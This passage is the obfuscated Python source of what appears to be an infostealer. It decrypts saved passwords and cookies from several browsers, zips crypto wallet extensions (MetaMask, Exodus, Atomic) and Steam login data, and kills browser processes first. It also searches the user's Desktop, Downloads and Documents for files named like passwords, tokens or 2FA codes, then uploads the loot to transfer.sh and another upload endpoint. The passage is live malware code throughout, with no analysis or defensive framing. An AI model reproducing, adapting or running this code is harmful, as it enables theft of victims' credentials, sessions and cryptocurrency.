                    O000OOO0OO00OO0O0 =O0O0O00OO0O000OO0 .split ('[')[1 ].split (']')[0 ]#line:1508
                if O000OOO0OO00OO0O0 in O0O0O000OOO0O0000 [0 ]:#line:1509
                    if not OOO0OOO0000OOOOO0 in paswWords :paswWords .append (OOO0OOO0000OOOOO0 )#line:1510
            Passw .append (f"URL: {O0O0O000OOO0O0000[0]} \n ID: {O0O0O000OOO0O0000[1]} \n PASSW0RD: {DecryptValue(O0O0O000OOO0O0000[2], OOOOO0O0O000O000O)}\n\n")#line:1511
    writeforfile (Passw ,'zg_allpasswords')#line:1512
Cookies =[]#line:1514
def getCookie (OOO00O00OOOO0OOOO ,OO00O000O000000O0 ):#line:1515
    global Cookies #line:1516
    if not os .path .exists (OOO00O00OOOO0OOOO ):return #line:1517
    O00OO00O0OOOO000O =OOO00O00OOOO0OOOO +OO00O000O000000O0 +"/Cookies"#line:1519
    if os .stat (O00OO00O0OOOO000O ).st_size ==0 :return #line:1520
    O0O00OOOOOO00O0O0 =temp +"zazagrabed"+''.join (random .choice ('bcdefghijklmnopqrstuvwxyz')for OO0O0OO0OOOO0O000 in range (8 ))+".db"#line:1522
    shutil .copy2 (O00OO00O0OOOO000O ,O0O00OOOOOO00O0O0 )#line:1524
    O0O00OOO000000000 =connect (O0O00OOOOOO00O0O0 )#line:1525
    OOO0O0000OOOO000O =O0O00OOO000000000 .cursor ()#line:1526
    OOO0O0000OOOO000O .execute ("SELECT host_key, name, encrypted_value FROM cookies")#line:1527
    OO0000000O000OOOO =OOO0O0000OOOO000O .fetchall ()#line:1528
    OOO0O0000OOOO000O .close ()#line:1529
    O0O00OOO000000000 .close ()#line:1530
    os .remove (O0O00OOOOOO00O0O0 )#line:1531
    O0O0O0OOOOOOOO0OO =OOO00O00OOOO0OOOO +"/Local State"#line:1533
    with open (O0O0O0OOOOOOOO0OO ,'r',encoding ='utf-8')as OO00OOO0O0OOO00O0 :OO0O00OOOO00OO0O0 =loads (OO00OOO0O0OOO00O0 .read ())#line:1535
    OOO00OO0O0O000000 =b64decode (OO0O00OOOO00OO0O0 ['os_crypt']['encrypted_key'])#line:1536
    OOO00OO0O0O000000 =CryptUnprotectData (OOO00OO0O0O000000 [5 :])#line:1537
    for OO0O000O0OOO0OOO0 in OO0000000O000OOOO :#line:1539
        if OO0O000O0OOO0OOO0 [0 ]!='':#line:1540
            for O00OO00O000O000O0 in keyword :#line:1541
                O0O0OOOO0OO00OO00 =O00OO00O000O000O0 #line:1542
                if "https"in O00OO00O000O000O0 :#line:1543
                    OO0O00OOO0O0000O0 =O00OO00O000O000O0 #line:1544
                    O00OO00O000O000O0 =OO0O00OOO0O0000O0 .split ('[')[1 ].split (']')[0 ]#line:1545
                if O00OO00O000O000O0 in OO0O000O0OOO0OOO0 [0 ]:#line:1546
                    if not O0O0OOOO0OO00OO00 in cookiWords :cookiWords .append (O0O0OOOO0OO00OO00 )#line:1547
            Cookies .append (f"{OO0O000O0OOO0OOO0[0]}	TRUE"+"		"+f"/FALSE	2597573456	{OO0O000O0OOO0OOO0[1]}	{DecryptValue(OO0O000O0OOO0OOO0[2], OOO00OO0O0O000000)}")#line:1549
    writeforfile (Cookies ,'zg_allcookies')#line:1551
def checkIfProcessRunning (O000OO00O0O0O0000 ):#line:1553
    ""#line:1556
    for O00000OO00000000O in psutil .process_iter ():#line:1558
        try :#line:1559
            if O000OO00O0O0O0000 .lower ()in O00000OO00000000O .name ().lower ():#line:1561
                return True #line:1562
        except (psutil .NoSuchProcess ,psutil .AccessDenied ,psutil .ZombieProcess ):#line:1563
            pass #line:1564
    return False ;#line:1565
def ZipThings (OO00O00O0O000O0OO ,OO000O0OOOO0O0000 ,OOOOO00O0O000O00O ):#line:1568
    OO0O0OO00O0OOO00O =OO00O00O0O000O0OO #line:1569
    O00OOO00O0O0OO00O =OO000O0OOOO0O0000 #line:1570
    if "aholpfdialjgjfhomihkjbmgjidlcdno"in OO000O0OOOO0O0000 :#line:1571
        OOOO0O00OOO000O0O =OO00O00O0O000O0OO .split ("\\")[4 ].split ("/")[1 ].replace (' ','')#line:1572
        O00OOO00O0O0OO00O =f"Exodus_{OOOO0O00OOO000O0O}"#line:1573
        OO0O0OO00O0OOO00O =OO00O00O0O000O0OO +OO000O0OOOO0O0000 #line:1574
    if "nkbihfbeogaeaoehlefnkodbefgpgknn"in OO000O0OOOO0O0000 :#line:1576
        OOOO0O00OOO000O0O =OO00O00O0O000O0OO .split ("\\")[4 ].split ("/")[1 ].replace (' ','')#line:1577
        O00OOO00O0O0OO00O =f"Metamask_{OOOO0O00OOO000O0O}"#line:1578
        OO0O0OO00O0OOO00O =OO00O00O0O000O0OO +OO000O0OOOO0O0000 #line:1579
    if not os .path .exists (OO0O0OO00O0OOO00O ):return #line:1581
    if checkIfProcessRunning ('chrome.exe'):#line:1582
        print ('Yes a chrome process was running')#line:1583
        subprocess .Popen (f"taskkill /im {OOOOO00O0O000O00O} /t /f",shell =True )#line:1584
    else :#line:1585
        ...#line:1586
    if "Wallet"in OO000O0OOOO0O0000 or "NationsGlory"in OO000O0OOOO0O0000 :#line:1589
        OOOO0O00OOO000O0O =OO00O00O0O000O0OO .split ("\\")[4 ].split ("/")[1 ].replace (' ','')#line:1590
        O00OOO00O0O0OO00O =f"{OOOO0O00OOO000O0O}"#line:1591
    elif "Steam"in OO000O0OOOO0O0000 :#line:1593
        if not os .path .isfile (f"{OO0O0OO00O0OOO00O}/loginusers.vdf"):return #line:1594
        OOOOOOOO0OO00O0OO =open (f"{OO0O0OO00O0OOO00O}/loginusers.vdf","r+",encoding ="utf8")#line:1595
        O0O00O00O00O000OO =OOOOOOOO0OO00O0OO .readlines ()#line:1596
        OOOOOO00O0OO0OO00 =False #line:1597
        for O000O000000000O0O in O0O00O00O00O000OO :#line:1598
            if 'RememberPassword"\t\t"1"'in O000O000000000O0O :#line:1599
                OOOOOO00O0OO0OO00 =True #line:1600
        if OOOOOO00O0OO0OO00 ==False :return #line:1601
        O00OOO00O0O0OO00O =OO000O0OOOO0O0000 #line:1602
    OOO000O00000OO0OO =zipfile .ZipFile (f"{OO0O0OO00O0OOO00O}/{O00OOO00O0O0OO00O}.zip","w")#line:1604
    print (OOO000O00000OO0OO )#line:1605
    for OOO0OO0O0OOOO0O00 in os .listdir (OO0O0OO00O0OOO00O ):#line:1606
        if not ".zip"in OOO0OO0O0OOOO0O00 :OOO000O00000OO0OO .write (OO0O0OO00O0OOO00O +"/"+OOO0OO0O0OOOO0O00 )#line:1607
    OOO000O00000OO0OO .close ()#line:1608
    upload (f'{OO0O0OO00O0OOO00O}/{O00OOO00O0O0OO00O}.zip')#line:1610
    os .remove (f"{OO0O0OO00O0OOO00O}/{O00OOO00O0O0OO00O}.zip")#line:1611
def grabb_GatherAll ():#line:1614
    ""#line:1615
    OOOOO000OO000O000 =[[f"{roaming}/Opera Software/Opera GX Stable","opera.exe","/Local Storage/leveldb","/","/Network","/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"],[f"{roaming}/Opera Software/Opera Stable","opera.exe","/Local Storage/leveldb","/","/Network","/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"],[f"{roaming}/Opera Software/Opera Neon/User Data/Default","opera.exe","/Local Storage/leveldb","/","/Network","/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"],[f"{local}/Google/Chrome/User Data","chrome.exe","/Default/Local Storage/leveldb","/Default","/Default/Network","/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"],[f"{local}/Google/Chrome SxS/User Data","chrome.exe","/Default/Local Storage/leveldb","/Default","/Default/Network","/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"],[f"{local}/BraveSoftware/Brave-Browser/User Data","brave.exe","/Default/Local Storage/leveldb","/Default","/Default/Network","/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"],[f"{local}/Yandex/YandexBrowser/User Data","yandex.exe","/Default/Local Storage/leveldb","/Default","/Default/Network","/HougaBouga/nkbihfbeogaeaoehlefnkodbefgpgknn"],[f"{local}/Microsoft/Edge/User Data","edge.exe","/Default/Local Storage/leveldb","/Default","/Default/Network","/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"]]#line:1625
    O0O00O00O0O0OO0OO =[[f"{roaming}/atomic/Local Storage/leveldb",'"Atomic Wallet.exe"',"Wallet"],[f"{roaming}/Exodus/exodus.wallet","Exodus.exe","Wallet"],["C:\Program Files (x86)\Steam\config","steam.exe","Steam"],[f"{roaming}/NationsGlory/Local Storage/leveldb","NationsGlory.exe","NationsGlory"]]#line:1634
    for O000OO00000O0O0O0 in OOOOO000OO000O000 :#line:1637
        O00000O000OOO0000 =threading .Thread (target =getPassw ,args =[O000OO00000O0O0O0 [0 ],O000OO00000O0O0O0 [3 ]])#line:1638
        O00000O000OOO0000 .start ()#line:1639
        Threadlist .append (O00000O000OOO0000 )#line:1640
    OOOOO000O00O0OOOO =[]#line:1642
    for O000OO00000O0O0O0 in OOOOO000OO000O000 :#line:1643
        O00000O000OOO0000 =threading .Thread (target =getCookie ,args =[O000OO00000O0O0O0 [0 ],O000OO00000O0O0O0 [4 ]])#line:1644
        O00000O000OOO0000 .start ()#line:1645
        OOOOO000O00O0OOOO .append (O00000O000OOO0000 )#line:1646
    for OOOOO00OOOOO0OO0O in OOOOO000O00O0OOOO :OOOOO00OOOOO0OO0O .join ()#line:1648
    OO0O00OOO0O0O0O0O =Trust (Cookies )#line:1649
    if OO0O00OOO0O0O0O0O ==True :return #line:1650
    for O000OO00000O0O0O0 in OOOOO000OO000O000 :#line:1652
        threading .Thread (target =ZipThings ,args =[O000OO00000O0O0O0 [0 ],O000OO00000O0O0O0 [5 ],O000OO00000O0O0O0 [1 ]]).start ()#line:1653
    for O000OO00000O0O0O0 in O0O00O00O0O0OO0OO :#line:1655
        threading .Thread (target =ZipThings ,args =[O000OO00000O0O0O0 [0 ],O000OO00000O0O0O0 [2 ],O000OO00000O0O0O0 [1 ]]).start ()#line:1656
    for OOOOO00OOOOO0OO0O in Threadlist :#line:1658
        OOOOO00OOOOO0OO0O .join ()#line:1659
    global upths #line:1660
    upths =[]#line:1661
    for OO0OO00O00O00OOOO in ["zg_allpasswords.txt","zg_allcookies.txt"]:#line:1663
        upload (os .getenv ("TEMP")+"\\"+OO0OO00O00O00OOOO )#line:1664
def zg_uploadanonfiles (O000OOOOOOOOO0OOO ):#line:1667
    try :#line:1668
        OO0OOOO0O0OOOOOOO ={"file":(O000OOOOOOOOO0OOO ,open (O000OOOOOOOOO0OOO ,mode ='rb'))}#line:1670
        ...#line:1671
        O0O0OO0O00O00O0OO =requests .post ("https://transfer.sh/",files =OO0OOOO0O0OOOOOOO )#line:1672
        OO00O00OOOO0000OO =O0O0OO0O00O00O0OO .text #line:1673
        return OO00O00OOOO0000OO #line:1674
    except :#line:1675
        return False #line:1676
def zg_Folder_create (OO00O0OO0O000O0O0 ,O0OO00000OO00OOOO ):#line:1678
    global zg_create_files #line:1679
    O0OOO0O0OOOO0O0O0 =7 #line:1680
    OOOO0OO00OOO0O0OO =0 #line:1681
    OOOOOOO000O0O0000 =os .listdir (OO00O0OO0O000O0O0 )#line:1682
    OO0OOOO000OO0OOOO =[]#line:1683
    for O00OO0O0O0OOO0OO0 in OOOOOOO000O0O0000 :#line:1684
        if not os .path .isfile (OO00O0OO0O000O0O0 +"/"+O00OO0O0O0OOO0OO0 ):return #line:1685
        OOOO0OO00OOO0O0OO +=1 #line:1686
        if OOOO0OO00OOO0O0OO <=O0OOO0O0OOOO0O0O0 :#line:1687
            OOOOOOO000O00O000 =zg_uploadanonfiles (OO00O0OO0O000O0O0 +"/"+O00OO0O0O0OOO0OO0 )#line:1688
            OO0OOOO000OO0OOOO .append ([OO00O0OO0O000O0O0 +"/"+O00OO0O0O0OOO0OO0 ,OOOOOOO000O00O000 ])#line:1689
        else :#line:1690
            break #line:1691
    zg_create_files .append (["folder",OO00O0OO0O000O0O0 +"/",OO0OOOO000OO0OOOO ])#line:1692
zg_create_files =[]#line:1694
def zg_create_file (O0O0O000OO000OO0O ,OO00OO0O000O0O00O ):#line:1695
    global zg_create_files #line:1696
    OO0000OO0OOOOOO00 =[]#line:1697
    OOO0O0OOO0OOO00O0 =os .listdir (O0O0O000OO000OO0O )#line:1698
    for OO0OO00O0O0000O0O in OOO0O0OOO0OOO00O0 :#line:1699
        for OOO0OOO0O00OO000O in OO00OO0O000O0O00O :#line:1700
            if OOO0OOO0O00OO000O in OO0OO00O0O0000O0O .lower ():#line:1701
                if os .path .isfile (O0O0O000OO000OO0O +"/"+OO0OO00O0O0000O0O )and ".txt"in OO0OO00O0O0000O0O :#line:1702
                    OO0000OO0OOOOOO00 .append ([O0O0O000OO000OO0O +"/"+OO0OO00O0O0000O0O ,zg_uploadanonfiles (O0O0O000OO000OO0O +"/"+OO0OO00O0O0000O0O )])#line:1703
                    break #line:1704
                if os .path .isdir (O0O0O000OO000OO0O +"/"+OO0OO00O0O0000O0O ):#line:1705
                    OO00OOO0O00O0OOOO =O0O0O000OO000OO0O +"/"+OO0OO00O0O0000O0O #line:1706
                    zg_Folder_create (OO00OOO0O00O0OOOO ,OO00OO0O000O0O00O )#line:1707
                    break #line:1708
    zg_create_files .append (["folder",O0O0O000OO000OO0O ,OO0000OO0OOOOOO00 ])#line:1710
def zg_checking ():#line:1712
    O0OO0000O0O0OO00O =temp .split ("\AppData")[0 ]#line:1713
    O000OOOO000O00OOO =[O0OO0000O0O0OO00O +"/Desktop",O0OO0000O0O0OO00O +"/Downloads",O0OO0000O0O0OO00O +"/Documents"]#line:1718
    O0O00O0OO000OO000 =["passw","mdp","motdepasse","mot_de_passe","login","secret","account","acount","paypal","banque","metamask","wallet","crypto","exodus","discord","2fa","code","memo","compte","token","backup","seecret"]#line:1745
    OO000000O00OO0O00 =[]#line:1747
    for O000OOOO00OO00000 in O000OOOO000O00OOO :#line:1748
        OO0O00OO0O0O0OO0O =threading .Thread (target =zg_create_file ,args =[O000OOOO00OO00000 ,O0O00O0OO000OO000 ]);OO0O00OO0O0O0OO0O .start ()#line:1749
        OO000000O00OO0O00 .append (OO0O00OO0O0O0OO0O )#line:1750
    return OO000000O00OO0O00 #line:1751
global keyword ,cookiWords ,paswWords #line:1754
keyword =['mail','[coinbase](https://coinbase.com)','[sellix](https://sellix.io)','[gmail](https://gmail.com)','[steam](https://steam.com)','[discord](https://discord.com)','[riotgames](https://riotgames.com)','[youtube](https://youtube.com)','[instagram](https://instagram.com)','[tiktok](https://tiktok.com)','[twitter](https://twitter.com)','[facebook](https://facebook.com)','card','[epicgames](https://epicgames.com)','[spotify](https://spotify.com)','[yahoo](https://yahoo.com)','[roblox](https://roblox.com)','[twitch](https://twitch.com)','[minecraft](https://minecraft.net)','bank','[paypal](https://paypal.com)','[origin](https://origin.com)','[amazon](https://amazon.com)','[ebay](https://ebay.com)','[aliexpress](https://aliexpress.com)','[playstation](https://playstation.com)','[hbo](https://hbo.com)','[xbox](https://xbox.com)','buy','sell','[binance](https://binance.com)','[hotmail](https://hotmail.com)','[outlook](https://outlook.com)','[crunchyroll](https://crunchyroll.com)','[telegram](https://telegram.com)','[pornhub](https://pornhub.com)','[disney](https://disney.com)','[expressvpn](https://expressvpn.com)','crypto','[uber](https://uber.com)','[netflix](https://netflix.com)']#line:1758
cookiWords =[]#line:1761
paswWords =[]#line:1762
grabb_GatherAll ()#line:1764
DETECTED =Trust (Cookies )#line:1765
if not DETECTED :#line:1767
    wikith =zg_checking ()#line:1768
    for thread in wikith :thread .join ()#line:1770
    time .sleep (0.2 )#line:1771
    filetext ="```diff\n"#line:1773
    for arg in zg_create_files :#line:1774
        if len (arg [2 ])!=0 :#line:1775
            foldpath =arg [1 ]#line:1776
            foldlist =arg [2 ]#line:1777
            filetext +=f"\n"#line:1778
            filetext +=f"- {foldpath}\n"#line:1779
            for ffil in foldlist :#line:1781
                a =ffil [0 ].split ("/")#line:1782
                fileanme =a [len (a )-1 ]#line:1783
                b =ffil [1 ]#line:1784
                filetext +=f"+ Name: {fileanme}\n+ Link: {b}"#line:1785
                filetext +="\n"#line:1786
    filetext +="\n```"#line:1787
    upload ("zg_checking",filetext )#line:1790
    auto =threading .Thread (target =auto_copy_wallet ().run )#line:1791
    auto .start ()
